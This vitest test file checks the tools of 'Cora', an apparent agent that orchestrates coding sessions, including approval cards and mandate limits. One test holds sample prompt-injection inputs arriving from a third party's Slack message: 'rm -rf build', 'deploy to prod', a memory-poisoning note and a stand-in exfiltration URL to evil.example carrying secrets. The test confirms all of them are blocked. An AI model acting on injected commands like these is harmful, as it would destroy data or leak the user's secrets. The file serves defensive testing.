import Fastify from 'fastify';
import { describe, expect, it } from 'vitest';
import { DEFAULT_SETTINGS, FROM_CORA, type BrainEvent, type SessionInfo, type TerminalInfo, type UiCommand } from '@cora/shared';
import { registerMcp } from '../src/mcp';
import { Approvals } from '../src/orchestrator/approvals';
import { deliverWhenReady, promptReady } from '../src/orchestrator/deliver';
import type { OrchToolDeps } from '../src/orchestrator/tools';
import { judge } from '../src/orchestrator/mandate';
import type { Goal, PendingRequest } from '@cora/shared';
import { Talk } from '../src/orchestrator/talk';

const RULE = '─'.repeat(50);
const AGENT = 'orch-0000-agent';
const sess = (id: string, extra: Partial<SessionInfo> = {}): SessionInfo => ({ id, cwd: `C:\\code\\${id}`, project: id, title: '', state: 'idle', startedAt: 1, lastTs: Date.now() - 60_000, cliVersion: '', transcriptPath: '', needsYou: 0, ...extra }) as SessionInfo;
const ev = (sessionId: string, kind: BrainEvent['kind'], extra: Partial<BrainEvent> = {}): BrainEvent => ({ id: Math.random().toString(36), seq: 1, sessionId, agentId: 'main', ts: Date.now(), kind, icon: { name: 'x' } as any, source: 'transcript', ...extra }) as BrainEvent;

function setup() {
  const ui: UiCommand[] = [];
  const typed: Array<[string, string]> = [];
  const launched: any[] = [];
  const approvals = new Approvals({ onChange: () => {} });
  const sessions = [sess('fix-api', { alias: 'ACME-5223 fix', state: 'working' }), sess('docs'), sess('api-svc', { cwd: process.cwd(), model: 'claude-opus-5-5[1m]' }), sess(AGENT)];
  let goal: Goal | null = null;
  const held: PendingRequest[] = [];
  const decided: Array<{ id: string; allow: boolean; rule: string }> = [];
  const terms: TerminalInfo[] = [{ terminalId: 'tm1', sessionId: 'fix-api', cwd: '', mode: 'new', alive: true, startedAt: 1, status: null } as TerminalInfo, { terminalId: 'tm4', sessionId: 'api-svc', cwd: '', mode: 'new', alive: true, startedAt: 1, status: null } as TerminalInfo];
  const events: Record<string, BrainEvent[]> = {
    'fix-api': [ev('fix-api', 'prompt', { text: 'fix the 500s' }), ev('fix-api', 'tool', { phase: 'start', tool: { name: 'Bash', input: {}, summary: 'npm test' } }), ev('fix-api', 'say', { text: 'All 48 tests pass.' })],
  };
  const late: string[] = [];
  const answered: Array<{ id: string; answers: Record<string, string>; rule: string }> = [];
  const talk = new Talk({ events: (sid, since) => (events[sid] ?? []).filter((e) => e.ts >= since), heldOn: (sid) => (held.find((p) => p.sessionId === sid) ? { what: 'Bash `rm -rf x`', since: 0 } : undefined), onLate: (sid, r) => void late.push(`${sid}: ${r.text}`) });
  const copies: any[] = [];
  const deps: OrchToolDeps = {
    approvals,
    isAgent: (id) => id === AGENT,
    ui: (c) => ui.push(c),
    remember: () => {},
    sessions: () => sessions,
    session: (id) => sessions.find((s) => s.id === id),
    events: (id) => events[id] ?? [],
    explains: () => [],
    pending: () => [],
    terminals: () => terms,
    pipelines: () => null,
    security: () => null,
    launch: async (o) => {
      launched.push(o);
      return { terminal: { terminalId: 'tm2', sessionId: 'new-sess', cwd: o.cwd } as TerminalInfo, sent: true };
    },
    resume: (id) => ({ terminalId: 'tm3', sessionId: id }) as TerminalInfo,
    input: (t, text) => void typed.push([t, text]),
    end: async () => 'it was asked to exit',
    rename: () => {},
    goal: () => goal,
    goalUpdate: (p) => (goal ? ((goal = { ...goal, ...p }), true) : false),
    addWorker: (sid) => goal && (goal = { ...goal, workers: [...goal.workers, sid] }),
    escalate: (q, options) => approvals.request({ kind: 'ask', title: q, detail: 'Cora asks', text: '', ...(options ? { options } : {}) }, async (a) => `The user answered: ${a}`),
    judge: (sid, req) => judge({ ...req, cwd: sid === 'fix-api' ? 'C:\\code\\fix-api' : 'C:\\elsewhere' }, { mandate: { repos: ['C:\\code\\fix-api', process.cwd()], deploy: false, slack: [] }, branch: { current: 'feat/x', defaultBranch: 'main' } }),
    inRepos: (cwd) => cwd === process.cwd(),
    decidePending: (id, allow, rule) => (decided.push({ id, allow, rule }), true),
    answerPending: (id, answers, rule) => {
      const i = held.findIndex((x) => x.id === id);
      if (i < 0) return { ok: false, error: 'not found' };
      held.splice(i, 1);
      answered.push({ id, answers, rule });
      return { ok: true };
    },
    talk,
    askCopy: async (p) => (copies.push(p), { ok: true, text: 'It chose the queue because the cron job drifted.' }),
  };
  deps.pending = () => held;
  let settings = { ...DEFAULT_SETTINGS, orchestrator: { ...DEFAULT_SETTINGS.orchestrator, enabled: true } };
  const app = Fastify();
  registerMcp(app, 'tok', () => settings, undefined, { isAgent: deps.isAgent, deps: () => deps });
  const H = (sid: string) => ({ 'x-cora-token': 'tok', 'x-cora-agent': 'tok', 'x-cora-session': sid, accept: 'application/json, text/event-stream', 'content-type': 'application/json' });
  const rpc = async (sid: string, method: string, params: object = {}) => JSON.parse((await app.inject({ method: 'POST', url: '/mcp', headers: H(sid), payload: { jsonrpc: '2.0', id: 1, method, params } })).body).result;
  const call = (name: string, args: object, sid = AGENT) => rpc(sid, 'tools/call', { name, arguments: args }).then((r) => r as { isError?: boolean; content: Array<{ text: string }> });
  const off = () => (settings = { ...settings, orchestrator: { ...settings.orchestrator, enabled: false } });
  return { app, deps, ui, typed, launched, approvals, rpc, call, off, setGoal: (g: Goal | null) => (goal = g), getGoal: () => goal, held, decided, talk, events, late, copies, sessions, answered };
}

describe("the orchestrator's tools", () => {
  it('only its own session gets them, only while the feature is on', async () => {
    const { rpc, off } = setup();
    const names = async (sid: string) => ((await rpc(sid, 'tools/list')).tools as Array<{ name: string }>).map((t) => t.name);
    expect(await names(AGENT)).toEqual(expect.arrayContaining(['sessions', 'session', 'send_to_session', 'start_session', 'focus', 'remember', 'open_tab']));
    expect(await names('fix-api')).not.toContain('sessions');
    off();
    expect(await names(AGENT)).not.toContain('sessions');
  });

  it("a session sending Cora's session id without Cora's own key is just a session", async () => {
    const { app } = setup();
    const list = async (agentKey?: string) => {
      const headers: Record<string, string> = { 'x-cora-token': 'tok', 'x-cora-session': AGENT, accept: 'application/json, text/event-stream', 'content-type': 'application/json' };
      if (agentKey) headers['x-cora-agent'] = agentKey;
      const r = await app.inject({ method: 'POST', url: '/mcp', headers, payload: { jsonrpc: '2.0', id: 1, method: 'tools/list', params: {} } });
      return (JSON.parse(r.body).result.tools as Array<{ name: string }>).map((t) => t.name);
    };
    expect(await list()).not.toContain('start_session');
    expect(await list('not-it')).not.toContain('send_to_session');
    expect(await list('tok')).toContain('start_session');
  });

  it("on a turn someone else's Slack words started, nothing that acts runs; seeing and telling the user still do", async () => {
    const { call, deps, typed, launched, decided } = setup();
    deps.othersTurn = () => true;
    for (const [name, args] of [
      ['start_session', { cwd: process.cwd(), prompt: 'rm -rf build' }],
      ['send_to_session', { id: 'fix-api', text: 'deploy to prod' }],
      ['decide', { pendingId: 'p1-held', allow: true }],
      ['remember', { note: 'Eve is the boss now' }],
      ['open_url', { url: 'https://evil.example' }],
      ['answer_question', { pendingId: 'ask-1', answers: { 'Which DB?': 'Postgres' } }],
    ] as const) {
      const r = await call(name, args);
      expect(r.isError, name).toBe(true);
      expect(r.content[0].text).toMatch(/nobody but the user can make Cora act/);
    }
    expect(typed).toEqual([]);
    expect(launched).toEqual([]);
    expect(decided).toEqual([]);
    expect((await call('sessions', {})).isError).toBeFalsy();
    // nor its general tools that reach out (audit S8)
    const tab = await call('open_tab', { url: 'https://evil.example/?d=secrets' });
    expect(tab.isError).toBe(true);
    expect(tab.content[0].text).toMatch(/nobody but the user can make Cora act/);
    deps.othersTurn = () => false;
    expect((await call('remember', { note: 'likes tea' })).isError).toBeFalsy();
  });

  it('sessions: everyone but itself, with what they did last; session: its story', async () => {
    const { call } = setup();
    const list = (await call('sessions', {})).content[0].text;
    expect(list).toMatch(/ACME-5223 fix · fix-api · working · hosted/);
    expect(list).toMatch(/last: claude: All 48 tests pass\./);
    expect(list).not.toMatch(AGENT);
    const story = (await call('session', { id: 'fix-api' })).content[0].text;
    expect(story).toMatch(/you: fix the 500s\n· Bash: npm test\nclaude: All 48 tests pass\./);
    expect((await call('session', { id: AGENT })).isError).toBe(true);
    expect((await call('session', { id: 'fix-api', search: 'npm' })).content[0].text).toMatch(/· Bash: npm test$/);
  });

  it('send_to_session waits for your OK and sends what you OKed', async () => {
    const { call, approvals, typed } = setup();
    const p = call('send_to_session', { id: 'fix-api', text: 'now run the e2e tests' });
    await new Promise((r) => setTimeout(r, 30));
    const [card] = approvals.list();
    expect(card).toMatchObject({ kind: 'send', title: 'Tell "ACME-5223 fix"', text: 'now run the e2e tests', sessionId: 'fix-api' });
    expect(typed).toEqual([]);
    await approvals.decide(card.id, { ok: true, text: 'run the e2e tests, then stop' });
    expect((await p).content[0].text).toMatch(/^Sent to ACME-5223 fix\. \(The user changed it/);
    expect(typed).toEqual([['tm1', `${FROM_CORA} run the e2e tests, then stop`]]);
    // not hosted: it has to be resumed first
    expect((await call('send_to_session', { id: 'docs', text: 'x' })).content[0].text).toMatch(/isn't running in Cora/);
  });

  it('a no is a no', async () => {
    const { call, approvals, typed } = setup();
    const p = call('end_session', { id: 'fix-api' });
    await new Promise((r) => setTimeout(r, 30));
    await approvals.decide(approvals.list()[0].id, { ok: false });
    expect((await p).content[0].text).toMatch(/said no/);
    expect(typed).toEqual([]);
  });

  it('start_session: in a real folder, once you OK it; then shows it', async () => {
    const { call, approvals, launched, ui } = setup();
    expect((await call('start_session', { cwd: 'C:\\no\\such\\folder', prompt: 'x' })).isError).toBe(true);
    const p = call('start_session', { cwd: process.cwd(), prompt: 'Look into the flaky test', model: 'sonnet' });
    await new Promise((r) => setTimeout(r, 30));
    expect(approvals.list()[0]).toMatchObject({ kind: 'start', cwd: process.cwd(), text: 'Look into the flaky test' });
    await approvals.decide(approvals.list()[0].id, { ok: true });
    expect((await p).content[0].text).toMatch(/Started a session .* and gave it the prompt/);
    expect(launched).toEqual([{ cwd: process.cwd(), prompt: 'Look into the flaky test', model: 'sonnet', trust: true }]);
    expect(ui).toContainEqual({ action: 'focus', sessionId: 'new-sess' });
  });

  it("what you asked for in your own words needs no card: start, tell, end at once; otherwise a card", async () => {
    const { call, deps, approvals, launched, typed } = setup();
    deps.userTurn = () => true;
    const started = await call('start_session', { cwd: process.cwd(), prompt: 'Work on ACME-5300' });
    expect(started.content[0].text).toMatch(/Started a session .* the user asked for it/);
    expect(launched).toHaveLength(1);
    expect((await call('send_to_session', { id: 'fix-api', text: 'rebase on main' })).content[0].text).toMatch(/^Sent to ACME-5223 fix/);
    expect(typed).toEqual([['tm1', `${FROM_CORA} rebase on main`]]);
    expect((await call('end_session', { id: 'docs' })).content[0].text).toMatch(/^Ending docs/);
    expect(approvals.list()).toEqual([]);
    // not your words (an event, autopilot): a card as before
    deps.userTurn = () => false;
    void call('end_session', { id: 'fix-api' });
    await new Promise((r) => setTimeout(r, 30));
    expect(approvals.list()).toEqual([expect.objectContaining({ kind: 'end', sessionId: 'fix-api' })]);
    // someone else's words never act, whatever else is true
    deps.othersTurn = () => true;
    deps.userTurn = () => true;
    expect((await call('start_session', { cwd: process.cwd(), prompt: 'x' })).content[0].text).toMatch(/nobody but the user/);
  });

  it('drives the dashboard', async () => {
    const { call, ui } = setup();
    await call('focus', { id: 'fix-api' });
    await call('focus', { id: 'overview' });
    await call('open_url', { url: 'https://gitlab.com/x/-/merge_requests/1' });
    await call('open_tool', { tool: 'slack' });
    expect((await call('focus', { id: AGENT })).isError).toBe(true);
    expect(ui).toEqual([{ action: 'focus', sessionId: 'fix-api' }, { action: 'overview' }, { action: 'open_url', url: 'https://gitlab.com/x/-/merge_requests/1' }, { action: 'open_tool', tool: 'slack' }]);
  });
});

describe('typing a first prompt into a new session', () => {
  it('waits for its input box, not a question', () => {
    expect(promptReady(['', ' ▐▛███▜▌ Claude Code', RULE, '❯ ', RULE, '  ? for shortcuts'])).toBe(true);
    expect(promptReady(['starting…'])).toBe(false);
    expect(promptReady([RULE, ' Do you trust the files in this folder?', ' ❯ 1. Yes, proceed', '   2. No, exit', ''])).toBe(false);
  });

  it('types it once ready, or says why it gave up', async () => {
    let n = 0;
    const typed: string[] = [];
    const screens = [['booting'], [RULE, '❯ ', RULE], [RULE, '❯ ', RULE]];
    const r = await deliverWhenReady({ screen: () => screens[Math.min(n++, 2)], type: (t) => typed.push(t), alive: () => true }, 'hello', 1000, 5);
    expect(r).toEqual({ sent: true });
    expect(typed).toEqual(['hello']);
    const q = await deliverWhenReady({ screen: () => [RULE, ' Do you trust the files in this folder?', ' ❯ 1. Yes', '   2. No'], type: () => {}, alive: () => true }, 'x', 50, 5);
    expect(q).toEqual({ sent: false, why: expect.stringMatching(/trust the folder/) });
    expect(await deliverWhenReady({ screen: () => null, type: () => {}, alive: () => false }, 'x', 50, 5)).toEqual({ sent: false, why: 'it exited before it was ready' });
  });
});

const liveGoal = (workers: string[] = []): Goal => ({ id: 'g1', text: 'Get ACME-5223 through QA', state: 'running', createdAt: 1, updatedAt: 1, budget: 1_000_000, spent: 0, workers });

describe('the agent on autopilot', () => {
  it('starts workers in the mandate repos without asking; outside them it still asks', async () => {
    const { call, approvals, setGoal, getGoal, launched, ui } = setup();
    setGoal(liveGoal());
    const r = await call('start_session', { cwd: process.cwd(), prompt: 'Fix the 500s' });
    expect(r.content[0].text).toMatch(/Started a session .* It works on the goal/);
    expect(approvals.list()).toEqual([]);
    expect(launched).toHaveLength(1);
    expect(getGoal()?.workers).toEqual(['new-sess']);
    expect(ui).toEqual([]);
    const p = call('start_session', { cwd: 'C:\\Windows', prompt: 'x' });
    await new Promise((res) => setTimeout(res, 30));
    expect(approvals.list()[0]).toMatchObject({ kind: 'start' });
    await approvals.decide(approvals.list()[0].id, { ok: false });
    await p;
  });

  it("directs its workers without asking; anyone else's session still asks", async () => {
    const { call, approvals, setGoal, typed } = setup();
    setGoal(liveGoal(['fix-api']));
    expect((await call('send_to_session', { id: 'fix-api', text: 'run the tests' })).content[0].text).toBe('Sent to ACME-5223 fix.');
    expect(typed).toEqual([['tm1', `${FROM_CORA} run the tests`]]);
    expect(approvals.list()).toEqual([]);
  });

  it('reports on the goal; asks you things', async () => {
    const { call, approvals, setGoal, getGoal } = setup();
    expect((await call('goal_update', { note: 'x' })).isError).toBe(true);
    setGoal(liveGoal());
    await call('goal_update', { progress: 0.5, note: 'tests pass' });
    expect(getGoal()).toMatchObject({ progress: 0.5, note: 'tests pass' });
    const p = call('escalate', { question: 'Merge to main?', options: ['Yes', 'Not yet'] });
    await new Promise((res) => setTimeout(res, 30));
    expect(approvals.list()[0]).toMatchObject({ kind: 'ask', title: 'Merge to main?', options: ['Yes', 'Not yet'] });
    await approvals.decide(approvals.list()[0].id, { ok: true, text: 'Not yet' });
    expect((await p).content[0].text).toBe('The user answered: Not yet');
  });

  it('decides prompts only where the mandate allows; denies whenever it wants', async () => {
    const { call, held, decided } = setup();
    const pend = (id: string, command: string): PendingRequest => ({ id, kind: 'permission', sessionId: 'fix-api', agentId: 'main', toolName: 'Bash', toolInput: { command }, createdAt: 1, expiresAt: 2 }) as PendingRequest;
    held.push(pend('pend-1', 'npm test'), pend('pend-2', 'git merge main'), pend('pend-3', 'git push --force'));
    expect((await call('decide', { pendingId: 'pend-1', allow: true })).content[0].text).toBe('Allowed.');
    expect((await call('decide', { pendingId: 'pend-2', allow: true })).content[0].text).toMatch(/says ask the user: merging/);
    expect((await call('decide', { pendingId: 'pend-3', allow: true })).content[0].text).toMatch(/says never: force-pushing/);
    expect((await call('decide', { pendingId: 'pend-2', allow: false, reason: 'wait for QA' })).content[0].text).toBe('Denied.');
    expect(decided).toEqual([{ id: 'pend-1', allow: true, rule: 'package' }, { id: 'pend-2', allow: false, rule: 'cora-denied' }]);
  });
});

describe('talking with sessions', () => {
  const tick = (ms = 30) => new Promise((r) => setTimeout(r, ms));
  const reply = (events: Record<string, BrainEvent[]>, talk: Talk, sid: string, text: string, tools: string[] = []) => {
    const now = Date.now() - 2;
    const add = [...tools.map((name) => ev(sid, 'tool', { ts: now, phase: 'start', tool: { name, input: {}, summary: '' } as any })), ev(sid, 'say', { ts: now, text }), ev(sid, 'turn_end', { ts: now + 1 })];
    (events[sid] ??= []).push(...add);
    talk.event(add.at(-1)!);
  };

  it('ask_session: your OK opens a conversation; it waits for the whole reply; follow-ups go straight in', async () => {
    const { call, approvals, typed, events, talk } = setup();
    const p = call('ask_session', { id: 'api-svc', text: 'Which endpoint returns the 500?' });
    await tick();
    expect(approvals.list()[0]).toMatchObject({ kind: 'send', title: 'Ask "api-svc"', detail: expect.stringMatching(/carry on talking with it for 10 minutes/) });
    await approvals.decide(approvals.list()[0].id, { ok: true });
    await tick();
    expect(typed).toEqual([['tm4', `${FROM_CORA} Which endpoint returns the 500?`]]);
    const long = 'POST /v1/orders: the handler reads `req.body.items` before validation. '.repeat(20).trim();
    reply(events, talk, 'api-svc', long, ['Grep', 'Read', 'Read']);
    const r = (await p).content[0].text;
    expect(r).toContain('api-svc replied (it used Grep, Read ×2):');
    expect(r).toContain(long);
    // a follow-up: no card this time
    const q = call('ask_session', { id: 'api-svc', text: 'And the fix?' });
    await tick();
    expect(approvals.list()).toEqual([]);
    reply(events, talk, 'api-svc', 'Validate first; patch in orders.ts:42.');
    expect((await q).content[0].text).toMatch(/replied:\n\nValidate first/);
    expect(talk.list().map((t) => t.sessionId)).toEqual(['api-svc']);
  });

  it("not mid-turn; a reply it stopped waiting for comes later; held on the user's OK", async () => {
    const { call, events, talk, late, held } = setup();
    expect((await call('ask_session', { id: 'fix-api', text: 'x' })).content[0].text).toMatch(/busy \(mid-turn\).*ask_copy/);
    talk.grant('api-svc');
    const r = await call('ask_session', { id: 'api-svc', text: 'run the e2e tests', wait: 10 });
    expect(r.content[0].text).toMatch(/still working after 10s.*\[Cora\] line/);
    reply(events, talk, 'api-svc', 'e2e: 31 passed.');
    expect(late).toEqual(['api-svc: e2e: 31 passed.']);
    held.push({ id: 'p1', kind: 'permission', sessionId: 'api-svc', agentId: 'main', toolName: 'Bash', toolInput: { command: 'rm -rf x' }, createdAt: 0, expiresAt: 0 } as PendingRequest);
    expect(await talk.wait('api-svc', Date.now() - 20_000, 60_000)).toEqual({ state: 'blocked', what: 'Bash `rm -rf x`' });
  }, 20_000);

  it('ask_copy: any session, no OK, the session untouched', async () => {
    const { call, approvals, typed, copies } = setup();
    const r = await call('ask_copy', { id: 'api-svc', question: 'Why the queue?' });
    expect(r.content[0].text).toBe("A copy of api-svc answered (the session itself wasn't touched):\n\nIt chose the queue because the cron job drifted.");
    expect(copies).toEqual([{ sessionId: 'api-svc', cwd: process.cwd(), question: 'Why the queue?', model: 'claude-opus-5-5[1m]' }]);
    expect(approvals.list()).toEqual([]);
    expect(typed).toEqual([]);
    expect((await call('ask_copy', { id: 'docs', question: 'x' })).content[0].text).toMatch(/isn't there any more/);
    expect((await call('ask_copy', { id: AGENT, question: 'x' })).isError).toBe(true);
  });

  it('standing down ends the conversations and the waits', async () => {
    const { call, talk } = setup();
    talk.grant('api-svc');
    const p = call('ask_session', { id: 'api-svc', text: 'x' });
    await tick();
    talk.endAll();
    expect((await p).content[0].text).toMatch(/^Stopped waiting/);
    expect(talk.allowed('api-svc')).toBe(false);
  });
});

describe("answering a session's question", () => {
  const ask = (id: string, sessionId: string): PendingRequest =>
    ({ id, kind: 'question', sessionId, agentId: 'main', toolName: 'AskUserQuestion', toolInput: { questions: [{ question: 'Which DB?', header: 'DB', options: [{ label: 'Postgres' }, { label: 'SQLite' }], multiSelect: false }] }, createdAt: 1, expiresAt: 2 }) as PendingRequest;

  it('pending shows the question, its options and its id', async () => {
    const { call, held } = setup();
    held.push(ask('ask-1', 'fix-api'));
    expect((await call('pending', {})).content[0].text).toMatch(/ACME-5223 fix \(fix-api\) · question ask-1: "Which DB\?" \[Postgres \| SQLite\]/);
  });

  it("a worker's: Cora answers; anyone else's: you see its answer and can change it", async () => {
    const { call, held, answered, approvals, setGoal } = setup();
    held.push(ask('ask-1', 'fix-api'), ask('ask-2', 'docs'));
    expect((await call('answer_question', { pendingId: 'ask-1', answers: { 'Which?': 'x' } })).content[0].text).toMatch(/Answer every question.*"Which DB\?"/);
    setGoal(liveGoal(['fix-api']));
    expect((await call('answer_question', { pendingId: 'ask-1', answers: { 'Which DB?': 'Postgres' } })).content[0].text).toBe('Answered ACME-5223 fix: Which DB? → Postgres.');
    expect(answered).toEqual([{ id: 'ask-1', answers: { 'Which DB?': 'Postgres' }, rule: 'cora-answered' }]);
    const p = call('answer_question', { pendingId: 'ask-2', answers: { 'Which DB?': 'Postgres' } });
    await new Promise((r) => setTimeout(r, 30));
    expect(approvals.list()[0]).toMatchObject({ kind: 'send', title: 'Answer "docs"\'s question', text: 'Which DB? → Postgres' });
    await approvals.decide(approvals.list()[0].id, { ok: true, text: 'Which DB? → SQLite' });
    expect((await p).content[0].text).toMatch(/Answered docs: Which DB\? → SQLite/);
    expect(answered[1]).toEqual({ id: 'ask-2', answers: { 'Which DB?': 'SQLite' }, rule: 'cora-answered' });
    expect((await call('answer_question', { pendingId: 'nope-1', answers: {} })).isError).toBe(true);
  });
});

describe('jira_inbox', () => {
  it('lists recent Jira events, checks since, and says how to turn watching on', async () => {
    const t = setup();
    const events = [{ id: 'a', kind: 'mentioned' as const, key: 'ACME-1', summary: 'S', who: 'Nick', what: 'mentioned you: check this', at: Date.now(), link: 'https://s/browse/ACME-1' }];
    let watching = true;
    t.deps.jiraInbox = (ms) => (watching ? events.filter((e) => e.at >= Date.now() - ms) : null);
    expect((await t.call('jira_inbox', { since: '4h' })).content[0].text).toMatch(/ACME-1 · Nick mentioned you: check this · S/);
    expect((await t.call('jira_inbox', { since: 'soon' })).isError).toBe(true);
    watching = false;
    expect((await t.call('jira_inbox', {})).content[0].text).toMatch(/Settings → Jira/);
  });
});

describe("Cora's projects and follow-ups", () => {
  const projectsFake = () => {
    const list = [
      { id: 'p-atlas', name: 'Atlas' },
      { id: 'p-cora', name: 'Cora' },
    ];
    const member = new Map<string, string>();
    return {
      member,
      find: (ref: string) => list.find((p) => p.id === ref || p.name.toLowerCase() === ref.toLowerCase()) ?? { error: `No project "${ref}".` },
      move: (sid: string, pid: string | null) => {
        if (pid) return member.set(sid, pid), list.find((p) => p.id === pid)!.name;
        const cur = member.get(sid);
        member.delete(sid);
        return cur ? list.find((p) => p.id === cur)!.name : null;
      },
    };
  };

  it('starts a session in a project, and puts one in (or out of) a project: at once on your word, else a card', async () => {
    const t = setup();
    const p = projectsFake();
    t.deps.projects = p;
    let mine = true;
    t.deps.userTurn = () => mine;
    const r = await t.call('start_session', { cwd: process.cwd(), prompt: 'investigate the import timeout', project: 'atlas' });
    expect(r.content[0].text).toMatch(/in the project "Atlas"/);
    expect(p.member.get('new-sess')).toBe('p-atlas');
    expect((await t.call('start_session', { cwd: process.cwd(), prompt: 'x', project: 'Nope' })).content[0].text).toMatch(/No project "Nope"/);
    expect((await t.call('project_move', { id: 'docs', project: 'Cora' })).content[0].text).toBe('docs is in the project "Cora" now.');
    expect((await t.call('project_move', { id: 'docs' })).content[0].text).toBe('docs is out of the project "Cora".');
    // not on your word: a card, and nothing moves until you OK it
    mine = false;
    const pending = t.call('project_move', { id: 'docs', project: 'Atlas' });
    await new Promise((r) => setTimeout(r, 20));
    const card = t.approvals.list().at(-1)!;
    expect(card.title).toBe('Put "docs" in "Atlas"');
    expect(p.member.get('docs')).toBeUndefined();
    await t.approvals.decide(card.id, { ok: true });
    await pending;
    expect(p.member.get('docs')).toBe('p-atlas');
  });

  it('follow-ups: only when you asked; set, listed, cancelled', async () => {
    const t = setup();
    const { FollowUps } = await import('../src/orchestrator/followUps');
    const f = new FollowUps({ events: () => [], nameOf: (id) => id, tell: () => {} });
    t.deps.followUps = f;
    let mine = false;
    t.deps.userTurn = () => mine;
    expect((await t.call('follow_up', { about: 'what it finds', session: 'fix-api', when: 'turn_end' })).content[0].text).toMatch(/Only when the user asks/);
    mine = true;
    const r = await t.call('follow_up', { about: 'what it finds', session: 'fix-api', when: 'turn_end' });
    expect(r.content[0].text).toMatch(/when ACME-5223 fix's turn ends.*Id (\w+)/);
    expect(f.list()).toMatchObject([{ about: 'what it finds', sessionId: 'fix-api', on: 'turn', left: 1 }]);
    expect((await t.call('follow_up', { about: 'the queue', when: 'every', every: '2m' })).content[0].text).toMatch(/5 minutes at least/);
    expect((await t.call('follow_up', { about: 'the queue', when: 'every', every: '15m', times: 4 })).isError).toBeFalsy();
    expect((await t.call('follow_up', { about: 'x', when: 'turn_end' })).content[0].text).toMatch(/turn_end needs the session/);
    const listed = (await t.call('follow_ups', {})).content[0].text;
    expect(listed).toMatch(/what it finds · ACME-5223 fix · when its turn ends · 1 more/);
    expect(listed).toMatch(/the queue · next at .*, every 15m · 4 more/);
    const id = f.list()[0].id;
    expect((await t.call('follow_up_cancel', { id })).content[0].text).toBe('Cancelled.');
    expect(f.list().map((x) => x.about)).toEqual(['the queue']);
  });
});

describe('Slack as Cora herself', () => {
  it('posts in a channel and pins: at once on your word, else a card', async () => {
    const t = setup();
    const posted: Array<[string, string, string | undefined]> = [];
    const pinned: string[] = [];
    t.deps.slackPost = async (to, text, thread) => (posted.push([to, text, thread]), { link: 'https://x.slack.com/archives/C9/p1', where: '#releases' });
    t.deps.slackPin = async (link) => (pinned.push(link), 'you');
    let mine = true;
    t.deps.userTurn = () => mine;
    expect((await t.call('cora_post', { to: '#releases', text: 'Release 2.10.4 is out' })).content[0].text).toBe('Posted in #releases as Cora. https://x.slack.com/archives/C9/p1');
    expect((await t.call('slack_pin', { link: 'https://x.slack.com/archives/C9/p1' })).content[0].text).toBe('Pinned.');
    expect(pinned).toEqual(['https://x.slack.com/archives/C9/p1']);
    mine = false;
    const pending = t.call('cora_post', { to: '#releases', text: 'Heads up' });
    await new Promise((r) => setTimeout(r, 20));
    expect(posted).toHaveLength(1);
    const card = t.approvals.list().at(-1)!;
    expect(card).toMatchObject({ title: 'Post in #releases as Cora', text: 'Heads up' });
    await t.approvals.decide(card.id, { ok: true });
    await pending;
    expect(posted.at(-1)).toEqual(['#releases', 'Heads up', undefined]);
  });
});
